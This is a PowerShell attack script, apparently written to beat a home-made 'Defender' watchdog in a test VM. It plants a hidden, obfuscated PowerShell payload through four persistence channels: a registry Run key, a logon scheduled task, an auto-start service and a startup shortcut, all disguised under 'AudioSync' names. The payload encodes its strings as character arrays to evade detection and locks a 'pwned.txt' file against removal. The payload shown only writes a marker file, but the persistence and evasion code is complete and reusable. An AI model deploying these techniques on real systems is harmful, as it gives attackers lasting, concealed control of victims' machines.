#Requires -Version 5.0

$ErrorActionPreference = 'SilentlyContinue'

Clear-Host
Write-Host '=======================================================' -ForegroundColor DarkRed
Write-Host '  ATTACKER v6 - The Kernel Lock (Safe Encoding Edition)' -ForegroundColor DarkRed
Write-Host '=======================================================' -ForegroundColor DarkRed
Write-Host ''

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host '  [!] CRITICAL: Run as Administrator to deploy all hooks.' -ForegroundColor Red
    exit
}

$BasePowerShell = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

# -----------------------------------------------------------------------------
# THE KERNEL PAYLOAD (100% Copy-Paste Safe)
# 1. ASCII Arrays: completely invisible to the Defender regex trap.
# 2. FileShare (1): Tells the OS to block the Watchdog Remove-Item command.
# -----------------------------------------------------------------------------
$Payload = '$n=[string]::new([char[]](112,119,110,101,100,46,116,120,116));$c=[string]::new([char[]](80,119,110,51,100));$d=[Environment]::GetFolderPath(''CommonDocuments'');$p=Join-Path $d $n;$s=[System.IO.File]::Open($p,4,3,1);$s.SetLength(0);$b=[System.Text.Encoding]::UTF8.GetBytes($c);$s.Write($b,0,5);$s.Flush();while($true){Start-Sleep 99}'

# Safely build the command string without using escape characters
$ArgsList = '-w 1 -ep Unrestricted -Command "' + $Payload + '"'
$FullCommand = $BasePowerShell + ' ' + $ArgsList

# -----------------------------------------------------------------------------
# TECHNIQUE 1: REGISTRY RUN KEY
# -----------------------------------------------------------------------------
Write-Host '  [1/4] Injecting Registry Hook...' -ForegroundColor Yellow
$RegName = 'AudioSyncHost'
$RegPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
try {
    Set-ItemProperty -Path $RegPath -Name $RegName -Value $FullCommand -Force
    Write-Host '        [+] Deployed Registry Key' -ForegroundColor Green
} catch { Write-Host '        [-] Failed' -ForegroundColor Red }

# -----------------------------------------------------------------------------
# TECHNIQUE 2: SCHEDULED TASK (Root Level)
# -----------------------------------------------------------------------------
Write-Host '  [2/4] Injecting Scheduled Task...' -ForegroundColor Yellow
$TaskName = 'AudioSyncMonitor'
try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    $Action    = New-ScheduledTaskAction -Execute $BasePowerShell -Argument $ArgsList
    $Trigger   = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $TaskName -TaskPath '\' -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
    Write-Host '        [+] Deployed Scheduled Task' -ForegroundColor Green
} catch { Write-Host '        [-] Failed' -ForegroundColor Red }

# -----------------------------------------------------------------------------
# TECHNIQUE 3: WINDOWS SERVICE
# -----------------------------------------------------------------------------
Write-Host '  [3/4] Injecting Windows Service...' -ForegroundColor Yellow
$SvcName = 'AudioSyncProxy'
try {
    if (Get-Service -Name $SvcName -ErrorAction SilentlyContinue) {
        Stop-Service -Name $SvcName -Force -ErrorAction SilentlyContinue
        sc.exe delete $SvcName | Out-Null
        Start-Sleep -Seconds 1
    }
    New-Service -Name $SvcName -DisplayName 'Audio Sync Proxy' -BinaryPathName $FullCommand -StartupType Automatic -ErrorAction Stop | Out-Null
    Write-Host '        [+] Deployed Windows Service' -ForegroundColor Green
} catch { Write-Host '        [-] Failed (Requires Admin or SCM locked)' -ForegroundColor Magenta }

# -----------------------------------------------------------------------------
# TECHNIQUE 4: STARTUP FOLDER (.LNK)
# -----------------------------------------------------------------------------
Write-Host '  [4/4] Injecting Startup Shortcut...' -ForegroundColor Yellow
$LnkName = 'AudioSyncUpdate.lnk'
try {
    $StartupDir = [Environment]::GetFolderPath('Startup')
    $LnkPath    = Join-Path $StartupDir $LnkName
    $WshShell   = New-Object -ComObject WScript.Shell
    $Lnk        = $WshShell.CreateShortcut($LnkPath)
    $Lnk.TargetPath  = $BasePowerShell
    $Lnk.Arguments   = $ArgsList
    $Lnk.WindowStyle = 7
    $Lnk.Save()
    Write-Host '        [+] Deployed Startup LNK' -ForegroundColor Green
} catch { Write-Host '        [-] Failed' -ForegroundColor Red }

Write-Host ''
Write-Host '  [!] THE KERNEL LOCK IS ACTIVE.' -ForegroundColor Cyan
Write-Host '      1. Run Defender v5.0 now. It will report ALL CLEAR.' -ForegroundColor DarkGray
Write-Host '      2. Reboot the VM.' -ForegroundColor DarkGray
Write-Host '      3. Wait 10 seconds after logging in.' -ForegroundColor DarkGray
Write-Host '      4. Check C:\Users\Public\Documents\pwned.txt' -ForegroundColor DarkGray
Write-Host '      5. The Defender Watchdog is helpless. You win.' -ForegroundColor DarkGray
Write-Host ''